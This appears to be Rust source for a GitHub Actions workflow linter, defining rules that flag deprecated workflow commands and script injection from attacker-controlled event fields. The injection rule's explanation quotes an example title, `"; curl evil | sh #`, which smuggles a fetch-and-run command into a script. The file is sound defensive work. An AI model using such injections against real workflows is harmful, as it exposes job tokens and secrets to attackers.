//! The `run:` scripts of a file: where they are, which shell runs them (the embedded code, see
//! `embedded`), and the rules that read their text.
//!
//! concept: new deprecated-commands, new script-injection, embedded-code
//! what: deprecated-commands: A script uses a workflow command that GitHub has disabled (`::set-output`, `::save-state`, `::set-env`, `::add-path`); write to `$GITHUB_OUTPUT`, `$GITHUB_STATE`, `$GITHU
//! what: script-injection: An expression in a `run` script reads text that an attacker can choose (an issue or pull request title, a branch name, a commit message): it is pasted into the script bef

use core_rules::embed_keys::{KeyEmbed, KeyEmbeds, find};
use core_rules::{FileContext, RuleContext};
use core_rules::{Meta, meta_regex, rule};
use core_syntax::embedded::size;
use core_syntax::{Embedded, Grammar, SyntaxNode, TextRange};
use std::sync::LazyLock;

const EXPRESSION_SOURCE: &str = r"(?s)\$\{\{(.*?)\}\}";

static EXPRESSION: LazyLock<Meta> =
    LazyLock::new(|| meta_regex(EXPRESSION_SOURCE).expect("a valid pattern"));

/// A step's `shell` and the defaults of its job and of the file name the language; no shell
/// means PowerShell on a Windows runner, else Shell. The JavaScript of `actions/github-script`
/// is text pasted from the same expressions: no parser reads it.
static SCRIPTS: KeyEmbeds = KeyEmbeds {
    rows: &[
        KeyEmbed {
            path: "jobs.*.steps.*.run",
            words: &[
                "jobs.$1.steps.$2.shell",
                "jobs.$1.defaults.run.shell",
                "defaults.run.shell",
            ],
            guess: Some(("jobs.$1.runs-on", "windows", "powershell")),
            language: "shell",
            when: None,
            settings: &[],
            unless: None,
        },
        KeyEmbed {
            path: "runs.steps.*.run",
            words: &["runs.steps.$1.shell", "defaults.run.shell"],
            guess: None,
            language: "shell",
            when: None,
            settings: &[],
            unless: None,
        },
        KeyEmbed {
            path: "jobs.*.steps.*.with.script",
            words: &[],
            guess: None,
            language: "",
            when: Some(("jobs.$1.steps.$2.uses", "actions/github-script")),
            settings: &[],
            unless: None,
        },
        KeyEmbed {
            path: "runs.steps.*.with.script",
            words: &[],
            guess: None,
            language: "",
            when: Some(("runs.steps.$1.uses", "actions/github-script")),
            settings: &[],
            unless: None,
        },
    ],
    languages: &[
        (&["bash", "sh"], "shell"),
        (&["pwsh", "powershell"], "powershell"),
    ],
    carve: EXPRESSION_SOURCE,
    plain: "Plain",
    block_header: "BlockHeader",
    literal: "|",
    escaped: false,
    format: false,
    foreign: None,
};

/// Every `run` script of the steps of the workflow's jobs and of a composite action, as regions;
/// the host parts inside them are the block's indentation and the `${{ }}` expressions, which
/// the shell never sees.
pub fn embedded(
    root: &SyntaxNode,
    text: &str,
    grammar: &Grammar,
    hooks: &dyn core_rules::RuleHooks,
) -> Vec<Embedded> {
    find(&SCRIPTS, grammar, hooks, root, text).to_vec()
}

/// The text of every script, with the offset of its range in the file.
fn script_texts<'a>(file: &FileContext<'a>) -> impl Iterator<Item = (usize, &'a str)> {
    let text = file.text;
    let found = find(&SCRIPTS, file.grammar, file.hooks, file.root, text);
    (0..found.len()).map(move |i| (usize::from(found[i].range.start()), &text[found[i].range]))
}

fn span(start: usize, len: usize) -> TextRange {
    TextRange::new(size(start), size(start + len))
}

static DEPRECATED: LazyLock<Meta> = LazyLock::new(|| {
    meta_regex(r"::(set-output|save-state|set-env|add-path)\b").expect("a valid pattern")
});

rule! {
    pub DeprecatedCommands {
        id: "deprecated-commands",
        category: Correctness,
        default: Error,
        description: "Reports a script that uses a workflow command that GitHub has disabled or deprecated: `::set-output`, `::save-state`, `::set-env` or `::add-path`.",
        why: "GitHub disabled `set-env` and `add-path` because any tool that prints a line to the \
                  log could set an environment variable or change the `PATH` of the job, so those two no longer work. `set-output` and `save-state` have the same weakness, are deprecated and make the run show a warning.\n\
                  To fix, append to the file the runner provides: `echo \"name=value\" >> \
                  \"$GITHUB_OUTPUT\"`, and `$GITHUB_STATE`, `$GITHUB_ENV` or `$GITHUB_PATH` for the \
                  others.",
        example: "steps:\n  - run: echo \"::set-output name=v::1\"   # reported",
    }

    fn check_file(&self, file: &FileContext<'_>, ctx: &mut RuleContext<'_>) {
        for (start, body) in script_texts(file) {
            for m in DEPRECATED.find_iter(body) {
                ctx.report(
                    span(start + m.start(), m.len()),
                    format!("the workflow command `{}` is deprecated", &body[m.range()]),
                );
            }
        }
    }
}

/// Contexts that carry text an attacker controls (`*` is any one name or index).
const UNTRUSTED: &[&str] = &[
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.pull_request.head.repo.default_branch",
    "github.event.discussion.title",
    "github.event.discussion.body",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.pages.*.page_name",
    "github.event.commits.*.message",
    "github.event.commits.*.author.email",
    "github.event.commits.*.author.name",
    "github.event.head_commit.message",
    "github.event.head_commit.author.email",
    "github.event.head_commit.author.name",
    "github.event.workflow_run.head_branch",
    "github.event.workflow_run.display_title",
    "github.event.workflow_run.head_commit.message",
    "github.event.workflow_run.head_commit.author.email",
    "github.event.workflow_run.head_commit.author.name",
    "github.head_ref",
];

static PATH: LazyLock<Meta> = LazyLock::new(|| {
    meta_regex(r"[A-Za-z_][\w-]*(?:\.[\w*-]+|\[\s*(?:'[^']*'|\d+|\*)\s*\])*")
        .expect("a valid pattern")
});

/// `a['b'][0]` as `a.b.*`, lowercase.
fn normalize(path: &str) -> String {
    let mut out = String::new();
    for part in path.split(['.', '[']) {
        let part = part.trim_end_matches(']').trim().trim_matches('\'');
        if !out.is_empty() {
            out.push('.');
        }
        out.push_str(&if part.chars().all(|c| c.is_ascii_digit()) {
            "*".into()
        } else {
            part.to_lowercase()
        });
    }
    out
}

fn untrusted(path: &str) -> bool {
    let path = normalize(path);
    UNTRUSTED.iter().any(|pattern| {
        let (a, b): (Vec<_>, Vec<_>) = (pattern.split('.').collect(), path.split('.').collect());
        a.len() == b.len()
            && a.iter()
                .zip(&b)
                .all(|(x, y)| x == y || *x == "*" || *y == "*")
    })
}

rule! {
    pub ScriptInjection {
        id: "script-injection",
        category: Correctness,
        default: Warn,
        description: "Reports an expression in a `run` script that reads text that an attacker can choose, \
                  such as the title or body of an issue or pull request, a branch name or a commit \
                  message.",
        why: "The runner replaces the `${{ }}` expression with its value before the shell sees the \
                  script. A title like `\"; curl evil | sh #` becomes part of the script and runs with \
                  the job's token and secrets.\n\
                  To fix, pass the value through an environment variable (`env:`) and read `\"$VAR\"` in \
                  the script.",
        example: "steps:\n  - run: echo \"${{ github.event.issue.title }}\"   # reported",
    }

    fn check_file(&self, file: &FileContext<'_>, ctx: &mut RuleContext<'_>) {
        for (start, body) in script_texts(file) {
            for expression in EXPRESSION.captures_iter(body) {
                let inner = expression.get_group(1).expect("the group always takes part");
                let inner_text = &body[inner.range()];
                for path in PATH.find_iter(inner_text).filter(|p| untrusted(&inner_text[p.range()])) {
                    ctx.report(
                        span(start + inner.start + path.start(), path.len()),
                        format!("`{}` can be set by an attacker and is pasted into the script", &inner_text[path.range()]),
                    );
                }
            }
        }
    }
}
